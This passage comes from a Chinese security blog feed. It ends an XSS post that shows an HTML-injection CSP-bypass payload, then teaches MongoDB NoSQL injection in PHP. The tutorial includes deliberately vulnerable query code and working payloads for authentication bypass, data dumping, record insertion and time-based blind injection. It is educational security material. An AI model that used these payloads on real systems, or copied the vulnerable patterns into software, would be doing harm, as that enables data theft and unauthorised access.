class="line">?q=&lt;html id=&quot;template&quot;&gt;&#123;&#123; alert(&apos;html inject hack&apos;) &#125;&#125;&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="/2019/08/18/利用HTML注入劫持标签Bypass-CSP/3.png" alt=""></p><p>Bingo，成功弹框，我们看下页面元素看下为啥能够成功劫持：</p><p><img src="/2019/08/18/利用HTML注入劫持标签Bypass-CSP/4.png" alt=""></p><p>可以看到，我们注入的id为template的HTML标签，被浏览器解析到当前页面DOM文档的顶部去了，整个页面的HTML标签中的内容都属于id为template的标签内容内，因此其中符合正则匹配的内容都会被匹配到并成功执行。</p><p>通过注入HTML标签的方式，我们就可以由在需劫持的标签下面的位置上升为全局的劫持的位置，从而让我们在全局的层面实现了劫持！</p><p>当然，这段HTML标签注入的payload，我在本地的Chrome、IE和360浏览器这些是能够触发成功的，但Firefox不能弹框，然而查看这些浏览器的页面元素都是一样的，至于触发与否应该就是不同浏览器不同机制的原因了。除此之外，这种劫持方法的利用场景在模板文件中会更容易出现。</p><h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="https://pagedout.institute/download/PagedOut_001_beta1.pdf" target="_blank" rel="noopener">PagedOut_001_beta1.pdf 第62页</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Web安全基础" scheme="https://www.mi1k7ea.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="XSS" scheme="https://www.mi1k7ea.com/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>NoSQL注入之MongoDB</title>
    <link href="https://www.mi1k7ea.com/2019/08/11/NoSQL%E6%B3%A8%E5%85%A5%E4%B9%8BMongoDB/"/>
    <id>https://www.mi1k7ea.com/2019/08/11/NoSQL注入之MongoDB/</id>
    <published>2019-08-11T08:57:43.000Z</published>
    <updated>2019-08-17T17:16:02.854Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-NoSQL与MongoDB基本概念"><a href="#0x01-NoSQL与MongoDB基本概念" class="headerlink" title="0x01 NoSQL与MongoDB基本概念"></a>0x01 NoSQL与MongoDB基本概念</h2><p><strong>NoSQL</strong></p><p>NoSQL，指的是非关系型的数据库。NoSQL有时也称作Not Only SQL的缩写，是对不同于传统的关系型数据库的数据库管理系统的统称。</p><p>NoSQL用于超大规模数据的存储。（例如谷歌或Facebook每天为他们的用户收集万亿比特的数据）。这些类型的数据存储不需要固定的模式，无需多余操作就可以横向扩展。</p><p><strong>NoSQL 数据库分类</strong></p><table><thead><tr><th>类型</th><th>部分代表</th><th>特点</th></tr></thead><tbody><tr><td>列存储</td><td>HbaseCassandraHypertable</td><td>顾名思义，是按列存储数据的。最大的特点是方便存储结构化和半结构化数据，方便做数据压缩，对针对某一列或者某几列的查询有非常大的IO优势。</td></tr><tr><td>文档存储</td><td>MongoDBCouchDB</td><td>文档存储一般用类似json的格式存储，存储的内容是文档型的。这样也就有机会对某些字段建立索引，实现关系数据库的某些功能。</td></tr><tr><td>key-value存储</td><td>Tokyo Cabinet / TyrantBerkeley DBMemcacheDBRedis</td><td>可以通过key快速查询到其value。一般来说，存储不管value的格式，照单全收。（Redis包含了其他功能）</td></tr><tr><td>图存储</td><td>Neo4JFlockDB</td><td>图形关系的最佳存储。使用传统关系数据库来解决的话性能低下，而且设计使用不方便。</td></tr><tr><td>对象存储</td><td>db4oVersant</td><td>通过类似面向对象语言的语法操作数据库，通过对象的方式存取数据。</td></tr><tr><td>xml数据库</td><td>Berkeley DB XMLBaseX</td><td>高效的存储XML数据，并支持XML的内部查询语法，比如XQuery,Xpath。</td></tr></tbody></table><p><strong>MongoDB</strong></p><p>MongoDB属于NoSQL数据库的一种，是由C++语言编写的一个基于分布式文件存储的开源数据库系统，旨在为Web应用提供可扩展的高性能数据存储解决方案。在高负载的情况下，添加更多的节点，可以保证服务器性能。</p><p>MongoDB 将数据存储为一个文档，数据结构由键值(key=&gt;value)对组成。MongoDB 文档类似于 JSON 对象。字段值可以包含其他文档，数组及文档数组。</p><p><strong>MongoDB概念解析</strong></p><p>和关系型数据库的相关概念不一样，在MongoDB中基本的概念是文档、集合、数据库，如下表：</p><table><thead><tr><th style="text-align:left">SQL术语/概念</th><th style="text-align:left">MongoDB术语/概念</th><th style="text-align:left">解释/说明</th></tr></thead><tbody><tr><td style="text-align:left">database</td><td style="text-align:left">database</td><td style="text-align:left">数据库</td></tr><tr><td style="text-align:left">table</td><td style="text-align:left">collection</td><td style="text-align:left">数据库表/集合</td></tr><tr><td style="text-align:left">row</td><td style="text-align:left">document</td><td style="text-align:left">数据记录行/文档</td></tr><tr><td style="text-align:left">column</td><td style="text-align:left">field</td><td style="text-align:left">数据字段/域</td></tr><tr><td style="text-align:left">index</td><td style="text-align:left">index</td><td style="text-align:left">索引</td></tr><tr><td style="text-align:left">table joins</td><td style="text-align:left"></td><td style="text-align:left">表连接,MongoDB不支持</td></tr><tr><td style="text-align:left">primary key</td><td style="text-align:left">primary key</td><td style="text-align:left">主键,MongoDB自动将_id字段设置为主键</td></tr></tbody></table><h2 id="0x02-PHP操作MongoDB"><a href="#0x02-PHP操作MongoDB" class="headerlink" title="0x02 PHP操作MongoDB"></a>0x02 PHP操作MongoDB</h2><p>PHP下操作MongoDB大致分为两种方式，对应有不同的注入攻击方式。</p><h3 id="使用MongoDB类中相应的方法"><a href="#使用MongoDB类中相应的方法" class="headerlink" title="使用MongoDB类中相应的方法"></a>使用MongoDB类中相应的方法</h3><p>使用的Demo大致如下，此时传递进入的参数是一个数组：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$mongo = <span class="keyword">new</span> MongoClient();</span><br><span class="line">$db = $mongo-&gt;myinfo; <span class="comment">//选择数据库</span></span><br><span class="line">$coll = $db-&gt;test; <span class="comment">//选择集合</span></span><br><span class="line">$coll-&gt;save();    <span class="comment">//增</span></span><br><span class="line">$coll-&gt;find();    <span class="comment">//查</span></span><br><span class="line">$coll-&gt;remove();    <span class="comment">//减</span></span><br><span class="line">$coll-&gt;update();    <span class="comment">//改</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>下面我们一个个执行一遍。</p><h4 id="确保连接及选择一个数据库"><a href="#确保连接及选择一个数据库" class="headerlink" title="确保连接及选择一个数据库"></a>确保连接及选择一个数据库</h4><p>为了确保正确连接，你需要指定数据库名，如果数据库在MongoDB中不存在，MongoDB会自动创建。</p><p>示例代码如下，访问页面会直接返回数据库名test：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$m = <span class="keyword">new</span> MongoClient(); <span class="comment">// 连接默认主机和端口为：mongodb://localhost:27017</span></span><br><span class="line">$db = $m-&gt;test; <span class="comment">// 获取名称为 "test" 的数据库</span></span><br><span class="line"><span class="keyword">echo</span> $db;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="创建集合"><a href="#创建集合" class="headerlink" title="创建集合"></a>创建集合</h4><p>创建集合的代码片段如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$m = <span class="keyword">new</span> MongoClient(); <span class="comment">// 连接</span></span><br><span class="line">$db = $m-&gt;test; <span class="comment">// 获取名称为 "test" 的数据库</span></span><br><span class="line">$collection = $db-&gt;createCollection(<span class="string">"Mi1k"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"集合创建成功："</span>.$collection;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在数据库中确认确实创建成功：</p><p><img src="/2019/08/11/NoSQL注入之MongoDB/1.png" alt=""></p><h4 id="插入文档"><a href="#插入文档" class="headerlink" title="插入文档"></a>插入文档</h4><p>在MongoDB中使用insert()方法插入文档，代码片段如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$m = <span class="keyword">new</span> MongoClient();    <span class="comment">// 连接到mongodb</span></span><br><span class="line">$db = $m-&gt;test;            <span class="comment">// 选择一个数据库</span></span><br><span class="line">$collection = $db-&gt;Mi1k; <span class="comment">// 选择集合</span></span><br><span class="line">$document = <span class="keyword">array</span>( </span><br><span class="line">    <span class="string">"title"</span> =&gt; <span class="string">"Hello"</span>, </span><br><span class="line">    <span class="string">"description"</span> =&gt; <span class="string">"Just a test."</span>, </span><br><span class="line">    <span class="string">"likes"</span> =&gt; <span class="number">100</span>,</span><br><span class="line">    <span class="string">"url"</span> =&gt; <span class="string">"https://www.mi1k7ea.com/"</span>,</span><br><span class="line">    <span class="string">"by"</span>, <span class="string">"mi1k7ea"</span></span><br><span class="line">);</span><br><span class="line">$collection-&gt;insert($document);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"数据插入成功"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>插入成功后，到数据库中确认，这里pretty()方法以格式化的方式来显示所有文档。：</p><p><img src="/2019/08/11/NoSQL注入之MongoDB/2.png" alt=""></p><h4 id="查找文档"><a href="#查找文档" class="headerlink" title="查找文档"></a>查找文档</h4><p>使用find()方法来读取集合中的文档，代码片段如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$m = <span class="keyword">new</span> MongoClient();    <span class="comment">// 连接到mongodb</span></span><br><span class="line">$db = $m-&gt;test;            <span class="comment">// 选择一个数据库</span></span><br><span class="line">$collection = $db-&gt;Mi1k; <span class="comment">// 选择集合</span></span><br><span class="line"></span><br><span class="line">$cursor = $collection-&gt;find();</span><br><span class="line"><span class="comment">// 迭代显示文档标题</span></span><br><span class="line"><span class="keyword">foreach</span> ($cursor <span class="keyword">as</span> $document) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $document[<span class="string">"title"</span>] . <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问即可看到查询的标题：</p><p><img src="/2019/08/11/NoSQL注入之MongoDB/3.png" alt=""></p><h4 id="更新文档"><a href="#更新文档" class="headerlink" title="更新文档"></a>更新文档</h4><p>使用update()方法来更新文档，代码片段如下，将标题内容从Hello改为World：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$m = <span class="keyword">new</span> MongoClient();    <span class="comment">// 连接到mongodb</span></span><br><span class="line">$db = $m-&gt;test;            <span class="comment">// 选择一个数据库</span></span><br><span class="line">$collection = $db-&gt;Mi1k; <span class="comment">// 选择集合</span></span><br><span class="line"><span class="comment">// 更新文档</span></span><br><span class="line">$collection-&gt;update(<span class="keyword">array</span>(<span class="string">"title"</span>=&gt;<span class="string">"Hello"</span>), <span class="keyword">array</span>(<span class="string">'$set'</span>=&gt;<span class="keyword">array</span>(<span class="string">"title"</span>=&gt;<span class="string">"World"</span>)));</span><br><span class="line"><span class="comment">// 显示更新后的文档</span></span><br><span class="line">$cursor = $collection-&gt;find();</span><br><span class="line"><span class="comment">// 循环显示文档标题</span></span><br><span class="line"><span class="keyword">foreach</span> ($cursor <span class="keyword">as</span> $document) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $document[<span class="string">"title"</span>] . <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>修改后显示改后的标题内容，客户端确认是修改了：</p><p><img src="/2019/08/11/NoSQL注入之MongoDB/4.png" alt=""></p><h4 id="删除文档"><a href="#删除文档" class="headerlink" title="删除文档"></a>删除文档</h4><p>使用remove()方法来删除文档。</p><p>代码片段如下，将移除’title’为’World’的一条数据记录：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$m = <span class="keyword">new</span> MongoClient();    <span class="comment">// 连接到mongodb</span></span><br><span class="line">$db = $m-&gt;test;            <span class="comment">// 选择一个数据库</span></span><br><span class="line">$collection = $db-&gt;Mi1k; <span class="comment">// 选择集合</span></span><br><span class="line">   </span><br><span class="line"><span class="comment">// 移除文档</span></span><br><span class="line">$collection-&gt;remove(<span class="keyword">array</span>(<span class="string">"title"</span>=&gt;<span class="string">"World"</span>), <span class="keyword">array</span>(<span class="string">"justOne"</span> =&gt; <span class="keyword">true</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 显示可用文档数据</span></span><br><span class="line">$cursor = $collection-&gt;find();</span><br><span class="line"><span class="keyword">foreach</span> ($cursor <span class="keyword">as</span> $document) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $document[<span class="string">"title"</span>] . <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问之后，即删除了title为World的文档，在数据库中查不到Mi1k集合的文档内容了。</p><h3 id="使用execute-函数执行字符串"><a href="#使用execute-函数执行字符串" class="headerlink" title="使用execute()函数执行字符串"></a>使用execute()函数执行字符串</h3><p>使用的Demo大致如下，此时传进方法execute()的参数就是字符串变量$query（特别的，此时的字符串书写语法为JS的书写语法）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$mongo = <span class="keyword">new</span> mongoclient();</span><br><span class="line">$db = $mongo-&gt;myinfo; <span class="comment">//选择数据库</span></span><br><span class="line">$query = <span class="string">"db.table.save(&#123;'newsid':1&#125;)"</span>;    <span class="comment">//增</span></span><br><span class="line">$query = <span class="string">"db.table.find(&#123;'newsid':1&#125;)"</span>;    <span class="comment">//查</span></span><br><span class="line">$query = <span class="string">"db.table.remove(&#123;'newsid':1&#125;)"</span>;    <span class="comment">//减</span></span><br><span class="line">$query = <span class="string">"db.table.update(&#123;'newsid':1&#125;,&#123;'newsid',2&#125;)"</span>;    改</span><br><span class="line">$result = $db-&gt;execute($query);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x03-NoSQL注入"><a href="#0x03-NoSQL注入" class="headerlink" title="0x03 NoSQL注入"></a>0x03 NoSQL注入</h2><h3 id="NoSQL注入分类"><a href="#NoSQL注入分类" class="headerlink" title="NoSQL注入分类"></a>NoSQL注入分类</h3><p>网上主要有两种分类方式，第一种是按照语言的分类：PHP数组注入、JavaScript注入、MongoDB shell拼接注入等等；第二种是按照攻击机制分类：重言式注入、联合查询注入、JavaScript注入等等，这种分类方式很像SQL注入的分类方式。</p><p>我们详细讨论下第二种分类方式：</p><h4 id="重言式注入"><a href="#重言式注入" class="headerlink" title="重言式注入"></a>重言式注入</h4><p>又称为永真式，此类攻击是在条件语句中注入代码，使生成的表达式判定结果永远为真，从而绕过认证或访问机制。</p><h4 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h4><p>联合查询是一种众所周知的SQL注入技术，攻击者利用一个脆弱的参数去改变给定查询返回的数据集。联合查询最常用的用法是绕过认证页面获取数据。</p><h4 id="JavaScript注入"><a href="#JavaScript注入" class="headerlink" title="JavaScript注入"></a>JavaScript注入</h4><p>这是一种新的漏洞，由允许执行数据内容中JavaScript的NoSQL数据库引入的。JavaScript使在数据引擎进行复杂事务和查询成为可能。传递不干净的用户输入到这些查询中可以注入任意JavaScript代码，这会导致非法的数据获取或篡改。</p><h2 id="0x04-PHP-MongoDB注入攻击"><a href="#0x04-PHP-MongoDB注入攻击" class="headerlink" title="0x04 PHP MongoDB注入攻击"></a>0x04 PHP MongoDB注入攻击</h2><p>不同编程语言环境下的MongoDB注入情景没啥差别，这里主要对PHP中实现的MongoDB进行详细分析，理解原理和场景就OK，其他语言就大致给Demo就好。</p><p>在此之前，我们需要先初始化数据库、赋给一些用户数据用于后面的Demo使用，这里随机添加10个用户，最后一个test用户为公共用户、大家都知道的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$m = <span class="keyword">new</span> MongoClient();    <span class="comment">// 连接到mongodb</span></span><br><span class="line">$db = $m-&gt;test;            <span class="comment">// 选择一个数据库</span></span><br><span class="line">$collection = $db-&gt;test; <span class="comment">// 选择集合</span></span><br><span class="line">$ori = <span class="string">'0123456789abcdefghijklmnopqrstuvwsyz'</span>;</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; <span class="number">10</span>; $i++) &#123; </span><br><span class="line">    $str = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ($j=<span class="number">0</span>; $j &lt; <span class="number">10</span>; $j++) &#123; </span><br><span class="line">        $str .= $ori[rand(<span class="number">0</span>, strlen($ori)<span class="number">-1</span>)];</span><br><span class="line">    &#125;</span><br><span class="line">    $data = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'userid'</span>=&gt;$i,</span><br><span class="line">        <span class="string">'username'</span>=&gt;<span class="string">'user'</span>.$i,</span><br><span class="line">        <span class="string">'password'</span>=&gt;$str</span><br><span class="line">        );</span><br><span class="line">    $collection-&gt;insert($data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'添加成功&lt;br&gt;'</span>;</span><br><span class="line">$data = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'userid'</span>=&gt;<span class="number">10</span>,</span><br><span class="line">    <span class="string">'username'</span>=&gt;<span class="string">'test'</span>,</span><br><span class="line">    <span class="string">'password'</span>=&gt;<span class="string">'test'</span></span><br><span class="line">    );</span><br><span class="line">$collection-&gt;insert($data);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'用户test添加成功'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问触发一遍即可创建成功：</p><p><img src="/2019/08/11/NoSQL注入之MongoDB/5.png" alt=""></p><h3 id="PHP数组注入-重言式注入"><a href="#PHP数组注入-重言式注入" class="headerlink" title="PHP数组注入/重言式注入"></a>PHP数组注入/重言式注入</h3><p>一个数组绑定的查询代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$mongo = <span class="keyword">new</span> MongoClient();    <span class="comment">// 连接到mongodb</span></span><br><span class="line">$db = $mongo-&gt;test; <span class="comment">//选择数据库</span></span><br><span class="line">$coll = $db-&gt;test; <span class="comment">//选择集合</span></span><br><span class="line">$username = $_GET[<span class="string">'username'</span>];</span><br><span class="line">$password = $_GET[<span class="string">'password'</span>];</span><br><span class="line">$data = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'username'</span>=&gt;$username,</span><br><span class="line">        <span class="string">'password'</span>=&gt;$password</span><br><span class="line">        );</span><br><span class="line">$data = $coll-&gt;find($data);</span><br><span class="line">$count = $data-&gt;count();</span><br><span class="line"><span class="keyword">if</span> ($count&gt;<span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($data <span class="keyword">as</span> $user) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'username:'</span>.$user[<span class="string">'username'</span>].<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'password:'</span>.$user[<span class="string">'password'</span>].<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'未找到'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>当我们用公共用户test输入时，显示出username和password：</p><p><img src="/2019/08/11/NoSQL注入之MongoDB/6.png" alt=""></p><p>分析一下，这里我输入的是<code>?username=test&amp;password=test</code>，然后进入到MongoDB中的语句其实为<code>db.test.find({username:&#39;test&#39;,password:&#39;test&#39;});</code>。</p><p>若此时我们以PHP数组的形式输入<code>?username[a]=test&amp;password=test</code>，源码中$data的值便为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$data = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'username'</span>=&gt;<span class="keyword">array</span>(<span class="string">'a'</span>=&gt;<span class="string">'test'</span>),</span><br><span class="line">        <span class="string">'password'</span>=&gt;<span class="string">'test'</span></span><br><span class="line">        );</span><br></pre></td></tr></table></figure><p>最后实际MongoDB执行的语句为<code>db.test.find({username:{a:&#39;test&#39;},password:&#39;test&#39;});</code>。</p><p>因此，我们就可以利用这个特性往数组的键名传递一个操作符（大于，小于，等于，不等于等等），从而达到利用的目的：</p><p><code>?username[$ne]=1&amp;password[$ne]=1</code></p><p>$ne即not equal不等于，转换到MongoDB语句即为：</p><p><code>db.test.find({username:{&#39;$ne&#39;:&#39;1&#39;},password:{&#39;$ne&#39;:&#39;1&#39;}});</code></p><p>而该语句相当于：</p><p><code>select * from test where username!=&#39;1&#39; and password!=&#39;1&#39;;</code></p><p>直接爆出了所有数据库用户信息：</p><p><img src="/2019/08/11/NoSQL注入之MongoDB/7.png" alt=""></p><h3 id="execute-执行拼接字符串导致的注入-联合查询注入"><a href="#execute-执行拼接字符串导致的注入-联合查询注入" class="headerlink" title="execute()执行拼接字符串导致的注入/联合查询注入"></a>execute()执行拼接字符串导致的注入/联合查询注入</h3><p>代码如下，为了方便查看注入的语句，我这里添加了输出查询语句：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$username = $_GET[<span class="string">'username'</span>];</span><br><span class="line">$password = $_GET[<span class="string">'password'</span>];</span><br><span class="line">$query = <span class="string">"var data = db.test.findOne(&#123;username:'$username',password:'$password'&#125;);return data;"</span>;</span><br><span class="line"><span class="keyword">echo</span> $query.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">$mongo = <span class="keyword">new</span> MongoClient();</span><br><span class="line">$db = $mongo-&gt;test;</span><br><span class="line">$data = $db-&gt;execute($query);</span><br><span class="line"><span class="keyword">if</span> ($data[<span class="string">'ok'</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($data[<span class="string">'retval'</span>]!=<span class="keyword">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'username:'</span>.$data[<span class="string">'retval'</span>][<span class="string">'username'</span>].<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'password:'</span>.$data[<span class="string">'retval'</span>][<span class="string">'password'</span>].<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'未找到'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> $data[<span class="string">'errmsg'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，是直接拼接起来的字符串然后传入execute()函数中执行。</p><p>正常访问：</p><p><img src="/2019/08/11/NoSQL注入之MongoDB/8.png" alt=""></p><p>添加个单引号试试，发现会报错：</p><p><img src="/2019/08/11/NoSQL注入之MongoDB/9.png" alt=""></p><p>此时可以利用注释或闭合的方法针对性地实现注入就可以了。</p><h4 id="利用注释"><a href="#利用注释" class="headerlink" title="利用注释"></a>利用注释</h4><p>按照输出的提示语句以及报错信息逐个尝试，目的是成功注释掉后面的password部分语句并返回成功，当输入如下payload时成功返回：</p><p><code>?username=test&#39;});return true;})//&amp;password=test</code></p><p><img src="/2019/08/11/NoSQL注入之MongoDB/10.png" alt=""></p><p>这里返回username和password两项，按照MongoDB数据的Json格式，我们可以让其返回Json键值对看看：</p><p><img src="/2019/08/11/NoSQL注入之MongoDB/11.png" alt=""></p><p>没问题，剩下的就是各种payload尝试了。</p><p>爆数据库版本：</p><p><code>?username=test&#39;});return {username:db.version(),password:1};})//&amp;password=test</code></p><p><img src="/2019/08/11/NoSQL注入之MongoDB/12.png" alt=""></p><p>爆当前数据库所有集合，这里因为db.getCollectionNames()返回的是数组、需要用tojson()转换为字符串，另外MongoDB函数区分大小写：</p><p><code>?username=test&#39;});return {username:tojson(db.getCollectionNames()),password:1};})//&amp;password=test</code></p><p><img src="/2019/08/11/NoSQL注入之MongoDB/13.png" alt=""></p><p>爆其他集合第一条数据，我这里本地新建user集合并插入文档，若想继续遍历爆其他信息只需修改数组下标即可：</p><p><code>?username=test&#39;});return {username:tojson(db.user.find()[0]),password:1};})//&amp;password=test</code></p><p><img src="/2019/08/11/NoSQL注入之MongoDB/14.png" alt=""></p><p>往user集合插入新用户数据：</p><p><code>?username=test&#39;});return {username:db.user.insert({&#39;username&#39;:&#39;mi1k7ea&#39;,&#39;password&#39;:&#39;mi1k7ea&#39;}),password:1};})//&amp;password=test</code></p><p><img src="/2019/08/11/NoSQL注入之MongoDB/15.png" alt=""></p><h4 id="利用闭合"><a href="#利用闭合" class="headerlink" title="利用闭合"></a>利用闭合</h4><p>构造如下payload，用于闭合后面的语句使语法正确：</p><p><code>?username=test&#39;});return {username:db.version(),password:1};var b=({a:&#39;1&amp;password=test</code></p><p><img src="/2019/08/11/NoSQL注入之MongoDB/16.png" alt=""></p><p>剩下的其他利用和前面的一样，这里只说个重点的，在无回显的情况下，我们就需要用到盲注技巧，这里用到的盲注是基于时间的盲注，在高版本下MongoDB添加了sleep()函数，我们利用这个sleep()函数和闭合的技巧来实现基于时间的盲注（这种盲注技巧仅在闭合的情况下可行，本人在注释的情况下并未成功）：</p><p><code>?username=test&#39;});if (db.version()&gt;&quot;0&quot;){sleep(10000);exit;}var b=({a:&#39;1&amp;password=test</code></p><p>若数据库版本大于0，则sleep 10s：</p><p><img 